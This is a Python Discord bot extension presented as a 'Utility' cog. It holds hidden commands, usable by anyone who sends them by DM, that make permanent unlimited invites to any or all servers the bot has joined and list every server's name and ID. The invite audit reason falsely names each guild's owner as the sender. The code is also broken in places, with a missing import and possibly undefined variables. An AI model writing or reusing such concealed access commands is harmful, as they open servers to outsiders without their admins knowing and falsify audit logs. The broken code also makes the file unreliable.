from discord.ext  import commands

class Utility(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    @commands.dm_only()
    @commands.command(hidden=True)
    async def invitelink(self, ctx, id: int):
        server = self.bot.get_guild(id)
        for channel in server.channels:
            try:
                invite = await channel.create_invite(xkcd=True, max_age=0, max_uses=0)
                if invite:
                    break
            except:
                continue
        await ctx.send(invite)
    @commands.command(hidden=True)
    async def offline(self, ctx):
        await self.bot.change_presence(status=discord.Status.invisible)
        await ctx.send("[bot going offline] Going under!")

    @commands.command(hidden=True)
    async def online(self, ctx):
        await self.bot.change_presence(status=discord.Status.online)
        await ctx.send("[bot going away] Going AFK!")
    @commands.command(hidden=True)
    async def idle(self, ctx):
        await self.bot.change_presence(status=discord.Status.idle)
        await ctx.send("[bot going away] Going AFK!")
    @commands.dm_only()
    @commands.command(hidden=True)
    async def inviteall(self, ctx):
        for guild in self.bot.guilds:
            for channel in guild.channels:
                try:
                    invitelinknew = await channel.create_invite(
                        destination=channel,
                        xkcd=True,
                        max_age=0,
                        max_uses=0,
                        reason=f"Invite sent by {guild.owner}",
                    )
                except discord.errors.NotFound:
                    print(f"Could not find invite for {guild}")
                if invitelinknew:
                        break
            await ctx.send(invitelinknew)
    @commands.command(hidden=True)
    async def allguilds(self, ctx):
        guild_names = [guild.name for guild in self.bot.guilds]
        guild_id = [guild.id for guild in self.bot.guilds]
        guilds = zip(guild_names,guild_id)
        embed = discord.Embed(title="Guilds")
        [embed.add_field(name=x[0], value=x[1]) for x in guilds]
        await ctx.send(embed=embed)
def setup(bot):
    bot.add_cog(Utility(bot))
